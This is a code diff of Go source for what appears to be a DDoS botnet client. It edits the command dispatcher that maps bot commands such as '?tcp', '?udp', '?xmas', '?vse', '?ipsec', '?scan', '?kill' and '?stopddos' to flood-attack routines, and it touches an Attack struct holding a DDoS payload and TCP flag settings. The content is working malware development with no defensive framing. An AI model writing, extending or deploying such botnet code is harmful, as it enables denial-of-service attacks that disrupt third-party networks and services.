@@ -29,7 +29,6 @@ type Attack struct {
 	dstPort                                              string
 	httpMethod, reqHeader                                string
 	flags                                                string
-	attackReport                                         string
 	reportSwitch, attackSwitch                           bool
 	ddosPayload                                          []byte
 	synFlag, ackFlag, rstFlag, pshFlag, finFlag, urgFlag bool
@@ -209,7 +208,7 @@ func ComdSetup(args int, cut string) string {
 }
 
 func SetupCaller() (Caller, bool) {
-	if ComdSetup(3, ":") == "?tcp" {
+	if Find(*BotReader, "?tcp") {
 		var CALL_5_ARG = map[string]Caller{
 			ComdSetup(3, ":"): {
 				CallAttack: &Attack{
@@ -225,7 +224,7 @@ func SetupCaller() (Caller, bool) {
 		}
 		value, key := CALL_5_ARG[ComdSetup(3, ":")]
 		return value, key
-	} else if ComdSetup(3, ":") == "?udp" || ComdSetup(3, ":") == "?saf" || ComdSetup(3, ":") == "?paf" || ComdSetup(3, ":") == "?xmas" {
+	} else if Find(*BotReader, "?udp") || Find(*BotReader, "?saf") || Find(*BotReader, "?paf") || Find(*BotReader, "?xmas") {
 		var CALL_4_ARG = map[string]Caller{
 			ComdSetup(3, ":"): {
 				CallAttack: &Attack{
@@ -240,7 +239,7 @@ func SetupCaller() (Caller, bool) {
 		}
 		value, key := CALL_4_ARG[ComdSetup(3, ":")]
 		return value, key
-	} else if ComdSetup(3, ":") == "?vse" || ComdSetup(3, ":") == "?fms" || ComdSetup(3, ":") == "?ipsec" || ComdSetup(3, ":") == "?scan" || ComdSetup(3, ":") == "?update" {
+	} else if Find(*BotReader, "?vse") || Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") || Find(*BotReader, "?scan") || Find(*BotReader, "?update") {
 		var CALL_2_ARG = map[string]Caller{
 			ComdSetup(3, ":"): {
 				CallAttack: &Attack{
@@ -266,7 +265,7 @@ func SetupCaller() (Caller, bool) {
 		}
 		value, key := CALL_2_ARG[ComdSetup(3, ":")]
 		return value, key
-	} else if ComdSetup(3, ":") == "?get" || ComdSetup(3, ":") == "?poling" {
+	} else if Find(*BotReader, "?get") || Find(*BotReader, "?poling") {
 		var CALL_1_ARG = map[string]Caller{
 			ComdSetup(3, ":"): {
 				CallAttack: &Attack{
@@ -278,7 +277,7 @@ func SetupCaller() (Caller, bool) {
 		}
 		value, key := CALL_1_ARG[ComdSetup(3, ":")]
 		return value, key
-	} else if ComdSetup(3, ":") == "?info" || ComdSetup(3, ":") == "?kill" || ComdSetup(3, ":") == "?stopddos" || ComdSetup(3, ":") == "?stopscan" {
+	} else if Find(*BotReader, "?info") || Find(*BotReader, "?kill") || Find(*BotReader, "?stopddos") || Find(*BotReader, "?stopscan") {
 		var CALL_NON_ARG = map[string]Caller{
 			ComdSetup(3, ":"): {
 				CallBot: &Bot{},
